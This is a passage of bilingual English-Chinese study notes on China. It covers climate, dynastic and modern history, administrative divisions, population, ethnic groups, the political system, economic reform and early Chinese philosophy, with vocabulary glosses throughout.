</blockquote>
</li>
</ul>
<h3 id="Climate"><a class="header-anchor" href="#Climate">¶</a>Climate</h3>
<ul>
<li>
<p>Most of China lies in the north temperate zone, characterized by a warm climate and distinctive seasons, a climate well suited for habitation.</p>
<blockquote>
<p>中国大部分地区位于北温带，气候温暖，四季分明，非常适合居住。</p>
</blockquote>
</li>
<li>
<p>Most of China has a marked continental monsoon (季风) climate characterized by varietu. From September to April the following year, the dry and cold winter monsoons blow from Siberia and the Mongolian Plateau, resulting in cold and dry winters and greater temperature difference between northern and southern China. From April to September, warm and humid summer monsoons blow from the seas in the east and south, resulting in overall high temperature and plentiful rainfall, and little temperature difference between northern and southern China.</p>
<blockquote>
<p>中国大部分地区具有明显的大陆性季风气候。从9月到次年4月，来自西伯利亚和蒙古高原的干冷冬季季风吹来，导致中国冬季寒冷干燥，南北温差较大。从4月到9月，温暖湿润的夏季季风从东部和南部的海洋吹来，导致中国整体气温高，雨量充沛，南北温差很小。</p>
</blockquote>
</li>
<li>
<p>In terms of temperature, the country can be sectored from south to north into the tropical zone, the subtropical zone, the warm-temperate zone, the temperate zone, the cold-temperate zone, and the Qinghai-Tibet Plateau alpine zone. Precipitation (降水量) gradually declines from the southeastern to the northwestern inland area, and the average annual precipitation varies greatly from place to place. In southeastern coastal areas, it reaches over 1,500 millimetres, while in northwestern areas, it drops to below 200 millimetres.</p>
<blockquote>
<p>从气温上看，我国从南到北可分为热带、亚热带、暖温带、温带、寒温带和青藏高原高寒地区。降水量(降水量)由东南向西北内陆地区逐渐减少，各地年平均降水量差异较大。在东南沿海地区，它达到1500毫米以上，而在西北地区，它下降到200毫米以下。</p>
</blockquote>
</li>
</ul>
<h2 id="Outline-History"><a class="header-anchor" href="#Outline-History">¶</a>Outline History</h2>
<blockquote>
<p>历史概述</p>
</blockquote>
<ul>
<li>
<p>China has a recorded history of nearly 4,000 years and is one of the four homes of the world’s earliest civilizations. The first primitive man known to have existed in China is Yuanmou Man (元谋人) , who lived about 1.7 million years ago. Peking Man, who existed more than 600,000 years ago at Zhoukoudian (周口店) , in the vicinity of modern Beijing, could walk upright, make and use simple tools, and make use of fire. The possessed basic human characteristics.</p>
<blockquote>
<p>中国有近4000年的历史，是世界四大文明发祥地之一。中国已知的第一个原始人是元谋人，他生活在大约170万年前。60多万年前，北京人生活在现代北京附近的周口店，他们可以直立行走，制作和使用简单的工具，还会使用火。他们具有人类的基本特征。</p>
</blockquote>
</li>
<li>
<p>Chinese history can be divided into two periods: the ancient period (ancient times - 1840) and the modern period (1840-present).</p>
<blockquote>
<p>中国历史可以分为两个时期:古代(古代至1840年)和近代(1840年至今)。</p>
</blockquote>
</li>
</ul>
<h3 id="Ancient-Period"><a class="header-anchor" href="#Ancient-Period">¶</a>Ancient Period</h3>
<ul>
<li>
<p>Chinese history began with two legendary figures – Emperor Huang and Emperor Yan, who, together with their tribes, inhabited the drainage area along the middle reaches of the Yellow River. After centuries of living side by side, these two tribes had gradually merged into one. Consequently, the Chinese people usually call themselves the “<u>descendants of Yan and Huang (炎黄子孙)</u>”.</p>
<blockquote>
<p>中国历史始于两个传奇人物——黄帝和炎帝，他们和他们的部落一起居住在黄河中游流域。这两个部落在一起生活了几个世纪后，逐渐合而为一。因此，中国人通常称自己为“炎黄子孙”(炎黄子孙)。</p>
</blockquote>
</li>
<li>
<p>These are many legends describing the life of the three sage (贤明的) kings after Emperor Huang and Emperor Yan – Yao, Shun and Yu. Yao made great contributions to the lunar calendar (农历) . His successor, Shun, was physically and intellectually gifted and was a man with great virtues. Yu was famous for conquering the floods. He inspired people to dig ditches to divert water away instead of building dams. He worked ceaselessly for 13 years and succeeded in controlling the floods. Legend has it that he was so busy that “thrice he had gone past his own house without even looking in”.</p>
<blockquote>
<p>有许多传说，描述了在黄帝和炎帝之后的三位圣人(贤明的)——尧、舜、禹的生活。尧对农历有很大的贡献(农历)。他的继任者舜，身体和智力都很有天赋，是一个很有美德的人。禹因征服洪水而闻名。他鼓励人们挖沟渠引水，而不是建水坝。他坚持不懈地奋斗了13年，终于成功地控制住了洪水。传说他太忙了，以至于“三过家门而不入”。</p>
</blockquote>
</li>
<li>
<p>It was Yu who established the Xia dynasty, during which the institution of slavery began.</p>
<blockquote>
<p>禹建立了夏朝，在夏朝开始实行奴隶制。</p>
</blockquote>
</li>
<li>
<p>Following the Xia dynasty arose the Shang dynasty (商朝：1600–1046 BC), the Western Zhou dynasty (西周：1046–771 BC), the Spring and Autumn and Warring States periods (春秋战国：770–221 BC).</p>
<blockquote>
<p>继夏朝之后，又出现了商朝(商朝:公元前1600-公元前1046年)、西周(西周:公元前1046-公元前771年)、春秋战国(春秋战国:公元前770-公元前221年)。</p>
</blockquote>
</li>
<li>
<p>In 221 BC, Ying Zheng, the highly gifted, ambitious king of the Qin Kingdom ended the turmoil and chaos among dukes (诸侯) and kings in the Warring States period. He established the first unites, centralized, multi-ethnic feudal monarchy (封建王朝) – the Qin dynasty (秦朝：221–206 BC) , styling himself “Shi Huangdi (meaning the First Emperor)”. Emperor Qinshihuang unified the language, the measurement system and the currency, set up the prefecture-county system (郡县制), constructed the famous Great Wall, and built extravagant (奢侈的) palaces and mausoleums.</p>
<blockquote>
<p>公元前221年，才华横溢、野心勃勃的秦王嬴政结束了战国时期诸侯之间的混乱。他建立了第一个统一的、中央集权的、多民族的封建君主政体(封建王朝)——秦朝(秦朝:公元前221—206年)，称自己为“始皇”。秦始皇统一了语言、度量衡和货币，设立了郡县制，修建了著名的长城、奢华的宫殿和陵墓。</p>
</blockquote>
</li>
<li>
<p>The Han dynasty (汉朝：206 BC–AD 220) was established by Liu Bang, with its capital at Chang’an (now Xi’an). It is divided into two periods: the Western Han dynasty (西汉：206 BC–AD 25) and the Eastern Han dynasty (东汉：AD 25-- 220).</p>
<blockquote>
<p>汉朝(汉朝:公元前206年-公元220年)由刘邦建立，定都于长安(现在的西安)。它分为两个时期:西汉(西汉:公元前206年—公元25年)和东汉(东汉:公元25年—220年)。</p>
</blockquote>
</li>
<li>
<p>The Han dynasty survived for 426 years. By the year 220, China evolved into the Three Kingdoms period (三国), in a tripartite balance (三国鼎立) of the Wei Kingdom (魏：AD 220–265), the Shu Kingdom (蜀：AD 221-- 263) and the Wu Kingdom (吴：AD222-280).</p>
<blockquote>
<p>汉朝延续426年。到公元220年，中国进入了魏国(魏:公元220—265年)、蜀国(蜀:公元221—263年)和吴国(吴:公元222—280年)(三国鼎立时期。</p>
</blockquote>
</li>
<li>
<p>Following the Three Kingdoms period were consecutively the Jin dynasty (晋：AD 265–420), the Southern and Northern dynasties (南北朝：AD 420–589) and the Sui dynasty (隋朝：AD 581–618). By the year 618, the Tang dynasty (唐朝：AD 618–907), the commonly regarded glorious period in Chinese history, was founded by Li Yuan.</p>
<blockquote>
<p>继三国之后，依次是晋朝(晋:公元265—420)、南北朝(南北朝:公元420—589)和隋朝(隋朝:公元581—618)。公元618年，李渊建立唐朝(唐朝:公元618—907年)，这是中国历史上公认的辉煌时期。</p>
</blockquote>
</li>
<li>
<p>Following the Tang dynasty came the period of the Five dynasties and the Ten Kingdoms (五代十国：AD 907–979). In 960, Zhao Kuangyin launched a rebellion. His lieutenants (随从将领) clothed him in the yellow imperial gown and asked him to <u>ascend the throne (登基)</u>. Thus, he established the Song dynasty (宋朝：960–1279).</p>
<blockquote>
<p>唐朝之后是五代十国时期(五代十国:公元907—979)。公元960年，赵匡胤发动叛乱。他的副官(随从将领)给他穿上黄色的皇袍，并要求他登基。因此，他建立了宋朝(宋朝:960—1279)。</p>
</blockquote>
</li>
<li>
<p>In 1206, Genghis Khan (成吉思汗) founded the Mongol Empire upon his unification of the scattered Mongol tribes. Kublai (忽必烈). a grandson of Genghis Khan, swept southwards across central China in 1271 and founded the Yuan dynasty (元朝：1271–1368) with Dadu (now Beijing) as the capital.</p>
<blockquote>
<p>1206年，成吉思汗(成吉思汗)统一了分散的蒙古部落，建立了蒙古帝国。忽必烈，成吉思汗的孙子，1271年向南横扫中原，建立了元朝(元朝:1271—1368)，定都大都(现在的北京)。</p>
</blockquote>
</li>
<li>
<p>In 1368, the Ming dynasty (明朝：1368–1644) was founded by Zhu Yuanzhang. During the later period of the Ming dynasty, a new military power in the northeast of China arose. Led by their chieftains (首领), the Manchu (满族) tribesmen on horseback fought with the Ming forces fir years at the Great Wall, and finally established the Qing dynasty (清朝：1644–1911)</p>
<blockquote>
<p>1368年，朱元璋建立明朝(明朝:1368—1644)。明朝后期，东北地区兴起了一支新的军事力量。在他们的首领(首领)的带领下，骑在马背上的满族部落与明朝军队在长城上进行了长达数年的战斗，最终建立了清朝(清朝:1644—1911)。</p>
</blockquote>
</li>
</ul>
<h3 id="Modern-Period"><a class="header-anchor" href="#Modern-Period">¶</a>Modern Period</h3>
<ul>
<li>
<p>The Opium War (鸦片战争) was the turning point in Chinese history which marked the close of the ancient period and the beginning of the modern history. From 1840 on, imperialists made continuous inroads (侵犯) into China, and China gradually became a country of semi-feudal, semi-colonial status.</p>
<blockquote>
<p>鸦片战争(鸦片战争)是中国历史的转折点，标志着古代历史的结束和现代历史的开始。1840年以后，帝国主义不断侵略中国，中国逐渐成为半封建半殖民地的国家。</p>
</blockquote>
</li>
<li>
<p>The Qing dynasty, the last of China’s feudal dynasties, was finally overthrown by the Revolution of 1911 led by Sun Yat-sen (1866–1925). One year later, the Republic of China (中华民国) was founded under his leadership.</p>
<blockquote>
<p>中国最后一个封建王朝清朝，最终被孙中山(1866- 1925)领导的辛亥革命推翻。一年后，他领导成立了中华民国。</p>
</blockquote>
</li>
<li>
<p>With the introduction of Marxism and Leninism into China and under the influence of the October Revolution in Russia, the 4 May Movement broke out in 1919, and in 1921 the CPC was founded, thus beginning a new period in Chinese history. After the anti-Japanese War and the Liberation War, the People’s Republic of China was founded in 1949.</p>
<blockquote>
<p>马克思列宁主义传入中国，在俄国十月革命的影响下，1919年爆发了“五四运动”，1921年中国共产党成立，开启了中国历史的新时期。经过抗日战争和解放战争，中华人民共和国于1949年成立。</p>
</blockquote>
</li>
</ul>
<h2 id="Administrative-Divisions"><a class="header-anchor" href="#Administrative-Divisions">¶</a>Administrative Divisions</h2>
<blockquote>
<p>行政区划</p>
</blockquote>
<ul>
<li>
<p>According to <u>the Constitution of the PRC (《中华人民共和国宪法》),</u> China’s administrative units are currently based on a three-tier system (三级建制) : (1) The country is divided into provinces, autonomous regions, and municipalities directly under the Central Government; (2) provinces and autonomous regions are divided into autonomous prefectures, counties, autonomous counties, and cities; (3) counties and autonomous counties are divided into townships, ethnic minority townships, and towns.</p>
<blockquote>
<p>根据《中华人民共和国宪法》，中国的行政单位目前是三级建制:(1)全国分为省、自治区、直辖市;(二)省、自治区分为自治州、县、自治县、市;(三)县、自治县设乡、民族乡、镇。</p>
</blockquote>
</li>
<li>
<p>At present China has 23 provinces, 5 autonomous regions, 4 municipalities directly under the Central Government, and 2 special administrative regions (SAR). The 23 provinces are Hebei, … . The 5 autonomous regions are the Inner Mongolia Autonomous Region, the Ningxia Hui Autonomous Region, the Xinjiang Uygur Autonomous Region, the Guangxi Zhuang autonomous Region and the Tibet Autonomous Region. The 4 municipalities directly under the Central Government are Beijing, Shanghai, Tianjin, and Chongqing. Hong Kong and Macao are two special administrative regions.</p>
<blockquote>
<p>目前，中国有23个省、5个自治区、4个直辖市和2个特别行政区。23个省是河北，… .这5个自治区分别是内蒙古自治区、宁夏回族自治区、新疆维吾尔自治区、广西壮族自治区和西藏自治区。4个直辖市是北京、上海、天津和重庆。香港和澳门是两个特别行政区。</p>
</blockquote>
</li>
</ul>
<h2 id="Population"><a class="header-anchor" href="#Population">¶</a>Population</h2>
<ul>
<li>
<p>China, the most populous country in the world, had a total population of about 1,370.54 million at the end of 2010, with a population increase of 73,899,804 since the fifth population census in 2000, according to the Statistical Communique on the 2010 population census released by the National Bureau of Statistics on 28 April 2011.</p>
<blockquote>
<p>国家统计局2011年4月28日发布的《2010年人口普查统计公报》显示，截至2010年底，中国总人口约为137054万人，自2000年第五次人口普查以来，人口增加了73899804人。中国是世界上人口最多的国家。</p>
</blockquote>
</li>
<li>
<p>Moreover, the country’s population density is high, with about 142 people per square kilometre but unevenly distributed. The population density in coastal regions in east China is higher, and that in the central and west China is lower. The distribution pattern is determined by economic and geographic conditions.</p>
<blockquote>
<p>此外，中国的人口密度很高，每平方公里约有142人，但分布不均匀。中国东部沿海地区人口密度较高，中西部地区人口密度较低。分布格局是由经济和地理条件决定的。</p>
</blockquote>
</li>
<li>
<p>When the PRC was founded in 1949, China had a population of about 541.67 million. Because of the stability of society, the development of production, the improvement of medical conditions, and a lack of awareness of the importance of medical conditions, China witnessed a rapid population increase to 829.92 million in 1970. Since the late 1970s, the Chinese government has been implementing the policy of family planning (计划生育政策), or “one child policy”, hoping to control the population increase, improve population quality, promote the development of economy and society, and protect the environment. As a result, by the end of 2011, the birth rate stood at 11.93 per thousand with a mortality rate at 7.14 per thousand, creating a natural growth rate of 4.79 per thousand, according to China Statistical Yearbook 2013.</p>
<blockquote>
<p>1949年中华人民共和国成立时，中国人口约为54167万。由于社会的稳定、生产的发展、医疗条件的改善以及对医疗条件重要性认识的缺乏，中国人口迅速增加到1970年的82992万人。自20世纪70年代末以来，中国政府一直在实施计划生育政策(计划生育政策)，即“独生子女政策”，希望控制人口增长，提高人口素质，促进经济社会发展，保护环境。根据《中国统计年鉴2013》，到2011年底，人口出生率为11.93‰，死亡率为7.14‰，自然增长率为4.79‰。</p>
</blockquote>
</li>
<li>
<p>The policy of family planning changed in 2014. It allows couples to have two children if either parent is an only child.</p>
<blockquote>
<p>2014年计划生育政策发生变化。它允许夫妻双方都是独生子女的夫妇生育两个孩子。</p>
</blockquote>
</li>
</ul>
<h2 id="Distribution-of-the-Ethnic-Groups"><a class="header-anchor" href="#Distribution-of-the-Ethnic-Groups">¶</a>Distribution of the Ethnic Groups</h2>
<ul>
<li>
<p>From the hinterlands (腹地) of the north to the lush jungles in the south, from the mountains of Taiwan in the east to the top of the world in the west, China serves as home to 56 ethnic groups. The Han people, the largest group, makes up about 91.51% of China’s vast population, and the world uses the term “Han culture” to refer to Chinese culture. The other 55 ethnic minority groups, nestled (安居) in China’s vast frontiers, maintain their own rich traditions and customs. Great contributions have been made by the ethnic minority groups to China’s culture and science. Many of China’s beautiful poems, myths, folk tales, songs, and dances come directly from ethnic minority groups.</p>
<blockquote>
<p>从北部的内陆(腹地)到南部的茂密丛林，从东部的台湾山脉到西部的世界之巅，中国是56个民族的家园。汉族是中国最大的民族，约占中国广大人口的91.51%，世界上用“汉文化”一词来指代中国文化。其他55个少数民族，安居在中国广阔的边疆，保持着自己丰富的传统和习俗。少数民族为中国的文化和科学事业作出了巨大贡献。中国许多美丽的诗歌、神话、民间故事、歌曲和舞蹈都直接来自少数民族。</p>
</blockquote>
</li>
<li>
<p>Compared with the Han people, the 55 ethnic minority groups are relatively small and differ markedly in culture and other aspects. According to the sixth national census conducted in 2010, the population of all the 55 ethnic minority groups totalled 113.79 million, accounting for 8.49% of the total population of China. The Mongolian, Hui, Tibetan, and Uygur peoples comprise the largest ethnic minority groups.</p>
<blockquote>
<p>与汉族相比，55个少数民族规模较小，文化等方面差异较大。根据2010年第六次全国人口普查，全国55个少数民族人口总数为11379万人，占全国总人口的8.49%。蒙古族、回族、藏族和维吾尔族是中国最大的少数民族。</p>
</blockquote>
</li>
<li>
<p>Although small in number, the 55 ethnic minority groups are distributed extensively throughout China. They are widely dispersed, often inhabiting strategically important border regions. The regions where they are most concentrated are Inner Mongolia, Xinjiang, Tibet, Guangxi, Ningxia, Heilongjiang, Jilin, Liaoning, Gansu, Qinghai, Sichuan, Yunnan, Guizhou, Guangdong, Hunan, Hebei, Fujian and Taiwan. Many ethnic minority peoples have traditionally established their villages in mountainous and pastoral areas, on high plateau and in deep forests.</p>
<blockquote>
<p>55个少数民族虽然人数不多，但分布广泛。他们分布广泛，通常居住在具有重要战略意义的边境地区。它们最集中的地区是内蒙古、新疆、西藏、广西、宁夏、黑龙江、吉林、辽宁、甘肃、青海、四川、云南、贵州、广东、湖南、河北、福建和台湾。许多少数民族传统上都在山区、牧区、高原、深林中建村。</p>
</blockquote>
</li>
<li>
<p>Equality, unity and common prosperity are the basic principles of the Chinese government in handling the relations between ethnic groups. In accordance with these basic principles, China practices a regional ethnic autonomy system, under which ethnic minority groups that live in compact (密集的) communities and autonomous organs practice self-government under the unified leadership of the state.</p>
<blockquote>
<p>平等、团结、共同繁荣是中国政府处理民族关系的基本原则。根据这些基本原则，中国实行民族区域自治制度，在国家统一领导下，在少数民族聚居的地方(密集的)和自治机关实行自治。</p>
</blockquote>
</li>
<li>
<p>As for the principle of common prosperity, there has been great development in the ethnic minority areas in the past three decades. At present, all of China’s five autonomous regions enjoy some preferential policies, which have brought visible profits to the ethnic minority areas. A number of infrastructure projects (基础建设) such as airports, expressways and water conservancy hubs have been built. In 2006 the Qinghai-Tibet Railway was extended to Lhasa, giving a rail connection to Tibet for the first time in its history. As a rapid, economical, all-weather transport channel of massive capacity between Tibet and the outside world, the railway has fundamentally changed the backward transport in the region.</p>
<blockquote>
<p>关于共同富裕的原则，少数民族地区在过去30年里有了很大的发展。目前，中国五个自治区都享有一定的优惠政策，这给少数民族地区带来了明显的利益。机场、高速公路、水利枢纽等一批基础建设项目相继建成。2006年，青藏铁路延伸至拉萨，实现了历史上第一次铁路通藏。铁路作为一条快速、经济、全天候、大容量的西藏对外运输通道，从根本上改变了西藏落后的交通状况。</p>
</blockquote>
</li>
<li>
<p>Great efforts have also been made in the educational and cultural undertakings in the ethnic minority areas. By the end of 2008, the number of ethnic minority students attending schools of all levels and all types in the whole country amounted to about 21 million.</p>
<blockquote>
<p>民族地区的教育文化事业也得到大力发展。截至2008年底，全国各级各类少数民族学校在校生约2100万人。</p>
</blockquote>
</li>
</ul>
<h2 id="Political-System"><a class="header-anchor" href="#Political-System">¶</a>Political System</h2>
<ul>
<li>
<p>The Constitution of the People’s Republic of China is the fundamental law of the state.</p>
<blockquote>
<p>中华人民共和国宪法是国家的根本法。</p>
</blockquote>
</li>
<li>
<p>The NPC is the supreme organ of state power. Local people’s congresses are the local organs of state power. The Standing Committee of the NPC is the permanent organ of the NPC. The term of office of the NPC and its Standing Committee is five years. The NPC and its Standing Committee are empowered with the rights of legislation, decision, supervision, election and removal.</p>
<blockquote>
<p>全国人民代表大会是最高国家权力机关。地方人民代表大会是地方国家权力机关。全国人民代表大会常务委员会是全国人民代表大会的常设机关。全国人民代表大会及其常务委员会每届任期五年。全国人民代表大会及其常务委员会有立法权、决策权、监督权、选举权和罢免权。</p>
</blockquote>
</li>
<li>
<p>The Great Hall of the People</p>
<blockquote>
<p>人民大会堂</p>
</blockquote>
</li>
<li>
<p>The CPC is the sole party in power in China. Apart from it, there are eight democratic parties in China. Multi-party cooperation and political consultation under the leadership of the CPC is the basic political system in China.</p>
<blockquote>
<p>中国共产党是中国唯一的执政党。除此之外，中国还有八个民主党派。中国共产党领导的多党合作和政治协商是中国的基本政治制度。</p>
</blockquote>
</li>
<li>
<p>The State Council of the People’s Republic of China is the highest executive organ of state power and the highest organ of state administration.</p>
<blockquote>
<p>中华人民共和国国务院是最高国家权力执行机关和最高国家行政机关。</p>
</blockquote>
</li>
<li>
<p>The CPPCC is a political advisory body under the leadership of the CPC and an organ for other political parties, mass organisations and personages of various social circles to take part in the running of the state.</p>
<blockquote>
<p>中国人民政治协商会议是中国共产党领导的政治协商机构，是其他政党、群众团体和社会各界人士参与国家管理的机关。</p>
</blockquote>
</li>
</ul>
<h2 id="Economic-Development-and-Reform"><a class="header-anchor" href="#Economic-Development-and-Reform">¶</a>Economic Development and Reform</h2>
<ul>
<li>
<p>China, economically backward before 1949, has become one of the world’s major economic powers with the greatest potential. In the years following reform and opening up in 1978, China’s economy has developed at an unprecedented rate, and that momentum (势头) has been held steady into the 21st century. The restructuring of the economy and resulting gains e contributed to a more than tenfold increase in GDP since 1978.</p>
<blockquote>
<p>1949年以前经济落后的中国，已成为世界上最具潜力的经济大国之一。自1978年改革开放以来，中国经济以前所未有的速度发展，进入21世纪，中国经济的发展势头一直保持稳定。自1978年以来，经济结构调整及其带来的收益使国内生产总值增长了十多倍。</p>
</blockquote>
</li>
<li>
<p>Deng Xiaoping was the chief architect who led China’s reform. The reform was designed to improve the socialist system, bring its benefits into full play and push forwards the drive for modernization. It not only promoted the sustained, rapid and sound development of China’s national economy, but also helped restructure its economic system. Most of China’s economic growth is attributed to the Special Economic Zones of China that spread successful economic experience to other areas.</p>
<blockquote>
<p>邓小平中国改革开放的总工程师。改革的目的是完善社会主义制度，充分发挥社会主义制度的效益，推动现代化建设向前发展。它不仅促进了中国国民经济持续快速健康发展，而且有助于中国经济体制的改革。中国经济增长的大部分归功于中国的经济特区，这些经济特区将成功的经济经验传播到其他地区。</p>
</blockquote>
</li>
<li>
<p>The successful reform has made China the world’s second largest economy by nominal GDP and by purchasing power parity, only after the United States/ It is now the largest exporter and second largest importer of goods in the world, and is also the largest manufacturing economy in the world.</p>
<blockquote>
<p>改革的成功实施，使中国成为名义国内生产总值和购买力平价仅次于美国的世界第二大经济体，成为世界第一大货物出口国和第二大货物进口国，也是世界第一大制造业经济体。</p>
</blockquote>
</li>
<li>
<p>The government’s 12th Five-Year Plan, adopted in March 2011, now emphasizes continued economic reforms and the need to increase domestic consumption in order to make the economy less dependent on exports in the future.</p>
<blockquote>
<p>2011年3月通过的政府第十二个五年计划现在强调继续进行经济改革和增加国内消费的必要性，以使经济在未来减少对出口的依赖。</p>
</blockquote>
</li>
</ul>
<h1>Part 1 Philosophy &amp; Religion, Literature, and Arts</h1>
<ul>
<li>
<p>Culturally, indigenous (本土的) Confucianism and Taoism, and the religions of foreign origin such as Buddhism, Islam, Catholicism and Christianity have influenced the thought, literature and arts of Chinese people over the centuries, which have shown their lasting charm for thousands of years.</p>
<blockquote>
<p>文化上，本土的儒教和道教，以及佛教、伊斯兰教、天主教和基督教等外来宗教，几个世纪以来影响了中国人的思想、文学和艺术，几千年来一直显示出持久的魅力。</p>
</blockquote>
</li>
</ul>
<h2 id="CHAPTER-1Philosophy-Religion"><a class="header-anchor" href="#CHAPTER-1Philosophy-Religion">¶</a>CHAPTER 1	Philosophy &amp; Religion</h2>
<h3 id="Philosophy"><a class="header-anchor" href="#Philosophy">¶</a>Philosophy</h3>
<ul>
<li>
<p>Chinese philosophy is the collective designation (总称) for the various schools of thought. It developed independent of European and other civilized countries, with its own distinguishing features, unique concept systems and expressive ways. Chinese philosophy has become one of the three philosophy systems in the world, the other two being Western philosophy and Indian philosophy.</p>
<blockquote>
<p>中国哲学是各种思想流派的总称。它是独立于欧洲和其他文明国家而发展起来的，有自己的特点、独特的概念体系和表现方式。中国哲学已经成为世界三大哲学体系之一，另外两个是西方哲学和印度哲学。</p>
</blockquote>
</li>
<li>
<p>Chinese philosophy is the soul of traditional Chinese culture and has developed over several thousand years. Its origin can be traced back to the Xia, Shang, and Zhou dynasties. It began to take definite shape during the Spring and Autumn Period and enjoyed thriving development because of the emergence of the “<u>contention and flourishing of numerous schools of thought</u>”</p>
<blockquote>
<p>中国哲学是中国传统文化的灵魂，已经发展了几千年。它的起源可以追溯到夏、商、周时期。它在春秋时期开始形成，并因“<u>百家争鸣</u>”的出现而蓬勃发展。</p>
</blockquote>
</li>
</ul>
<h3 id="Development-of-Ancient-Chinese-Philosophy"><a class="header-anchor" href="#Development-of-Ancient-Chinese-Philosophy">¶</a>Development of Ancient Chinese Philosophy</h3>
<ul>
<li>
<p>In general, ancient Chinese philosophy progresses through the following periods.</p>
<blockquote>
<p>总的来说，中国古代哲学经历了以下几个时期的发展。</p>
</blockquote>
</li>
</ul>
<h4 id="Philosophy-During-the-Pre-Qin-Times-先秦子学"><a class="header-anchor" href="#Philosophy-During-the-Pre-Qin-Times-先秦子学">¶</a>Philosophy During the Pre-Qin Times (先秦子学)</h4>
<ul>
<li>
<p>The philosophy in the pre-Qin times was marked by the emergence of various ancient philosophy views. The most influential schools were Confucianism, Taoism, Mohism and Legalism.</p>
<blockquote>
<p>先秦哲学的特点是出现了各种古代哲学观。最有影响的学派是儒、道、墨、法。</p>
</blockquote>
</li>
<li>
<p>Confucianism is a school of thought represented by Confucius and Mencius. The school takes the teaching of Confucius as its core of thought and regards the words and deeds of Confucius as its highest code (准则) of behaviour. It advocates benevolence and justice, allegiance and forbearance (仁、义、忠、恕), the doctrine of the golden mean and values the ethical (伦理的) relations of men. It emphasizes the importance of family and society order. Children must respect and be dutiful to their parents. The younger must obey the elder. The junior must follow the senior. The servants must serve their rulers. The influence of Confucianism is so predominant (显著的) that the word “Confucian” can directly represent traditional Chinese life and culture. Confucianism is not confined to China. Neighboring countries such as Japan and Vietnam also embrace (信奉) Confucianism in their national life and culture.</p>
<blockquote>
<p>儒家思想以孔子、孟子为代表。孔孟学派以孔子的教学为思想核心，以孔子的言行为最高行为准则。它提倡仁，义，忠，恕，中庸之道，重视人与人之间的伦理关系。它强调家庭和社会秩序的重要性。孩子必须尊重父母，孝敬父母。年轻的必须服从年长的。低年级学生必须跟着高年级学生。仆人必须侍奉他们的主人。儒家思想的影响如此显著，以至于“儒家”一词可以直接代表中国传统的生活和文化。儒家思想并不局限于中国。日本、越南等邻国也在国民生活和文化中信奉儒家思想。</p>
</blockquote>
</li>
<li>
<p>Taoism is a school of thought founded by Laozi and Zhuangzi. The school advocates the doctrine that Tao is the course, the principle, the substance, and the standard of all things, to which all people must conform (遵从), Based on the work of <em>Daodejing</em> (also named Laozi), Taoism promotes the belief that a person should live a simple life, not to strive for wealth, fame or power, which will only bring one worries and troubles. With proper behavior and self-restraint, a person can achieve great inner strength and a prolonged (延长的) life.</p>
<blockquote>
<p>道教是老子和庄子创立的一个思想流派。道家主张道是一切事物的过程、原则、实质和标准，所有人都必须遵从。道家以《道德经》(又名《老子》)为基础，提倡一个人应该过简单的生活，不追求财富、名利或权力，这只会给人带来烦恼和烦恼。通过适当的行为和自我约束，一个人可以获得巨大的内在力量和延长的寿命</p>
</blockquote>
</li>
<li>
<p>The school favours the political principle of “achieving good government through non-action”.</p>
<blockquote>
<p>道家学派赞成“无为而治”的政治原则。</p>
</blockquote>
</li>
<li>
<p>Mohism, based on the teachings of Mozi, cherishes universal love which states that if all the people in the world loved one another, there would be no hatred, calamities (灾难) and hostilities. In politics and ethics Mohism advocates honouring virtuous people, opposing fatalism (宿命论) and aggressive wars, and upholding thriftiness and simple funerals.</p>
<blockquote>
<p>墨家，基于墨子的教义，珍视普遍的爱，如果世界上所有的人都彼此相爱，就不会有仇恨，灾难和敌对。在政治和伦理上，墨家主张尊重贤人，反对宿命论和侵略战争，提倡节俭和简单的葬礼。</p>
</blockquote>
</li>
<li>
<p>Legalism, begun by Hanfeizi, believes that it is necessary to lay down laws to unify the thought of people, to promote agriculture to achieve affluence (富裕) , to wage (发动) wars to gain strength and power, and to establish a system of bureaucracy (官僚制度). The Legalists also hold that contradiction is present everywhere, and the two sides of a contradiction are changeable.</p>
<blockquote>
<p>由韩非子开创的法家主义，认为必须制定法律以统一人们的思想，必须推动农业以实现富裕，必须发动战争以获得力量和权力，必须建立官僚制度。法家还认为，矛盾是无处不在的，矛盾的两面是可以改变的。</p>
</blockquote>
</li>
</ul>
<h4 id="Orthodox-Philosophy-During-the-Han-Dynasty-两汉经学"><a class="header-anchor" href="#Orthodox-Philosophy-During-the-Han-Dynasty-两汉经学">¶</a>Orthodox Philosophy During the Han Dynasty (两汉经学)</h4>
<ul>
<li>
<p>In the Han dynasty, Emperor Wudi instituted the campaign of “banning all schools of thought except Confucianism (罢黜百家，独尊儒术)”. He rules out various schools of thought and chose officials from those who were steeped (专心于) in Confucianism only. Consequently, Confucianism became an orthodox school that served as the ideological of the feudal rule throughout the dynasties in China.</p>
<blockquote>
<p>汉武帝在汉代发起了“罢黜百家，独尊儒术)。他罢黜了各种思想流派，只从那些专心于儒家思想中的人中挑选官员。因此，儒家思想成为中国历代封建统治思想的正统学派。</p>
</blockquote>
</li>
<li>
<p>Orthodox philosophy advocates that Heaven affects human affairs and human behaviour finds responses in Heaven (天人感应) and that the power of the emperors are authorized by Heaven (君权神授). Natural disasters are Heaven’s punishment and condemnation of human behaviour. However, human moral conduct, and political and social upheaval (骚乱), in turn, will effect changes in Heaven. This theory, inspired by Dong Zhongshu, is at odds with Confucianism which holds that man is an integral part of nature (天人合一).</p>
<blockquote>
<p>正统哲学主张&quot;天理人事&quot;，“天人感应”，“君权神授”。自然灾害是上天对人类行为的惩罚和谴责。然而，人类的道德行为，政治和社会动荡，反过来，将影响天道的变化。这一理论受到董仲舒的启发，与认为人是自然不可分割的一部分的儒家思想不一致。</p>
</blockquote>
</li>
</ul>
<h4 id="Metaphysics-During-the-Wei-and-Jin-Dynasties-魏晋玄学"><a class="header-anchor" href="#Metaphysics-During-the-Wei-and-Jin-Dynasties-魏晋玄学">¶</a>Metaphysics During the Wei and Jin Dynasties (魏晋玄学)</h4>
<ul>
<li>
<p>Metaphysics in China blended Confucianism and Laozi’s doctrines and was based on the famous classical works of <em>The Book of Changes</em> (《易经》), <em>Daodejing</em> and <em>Zhuangzi</em>, known as the “three profound studies (三玄)”. To explore the noumenon (本体) of the universe is the theme of metaphysics. It mainly discusses the propositions of “extensive versus non-existence”, “essentials versus non-essentials”, “words versus ideas”, “fundamentals versus practice” and “ethics versus nature”, etc.</p>
<blockquote>
<p>中国的形而上学融合了儒家和老子的学说，并以著名的经典著作《易经》、《道德经》和《庄子》为基础，被称为“三玄”。探索宇宙的本体是形而上学的主题。主要论述了“外延与不存在”、“要旨与非要旨”、“言词与思想”、“基础与实践”、“伦理与自然”等命题。</p>
</blockquote>
</li>
</ul>
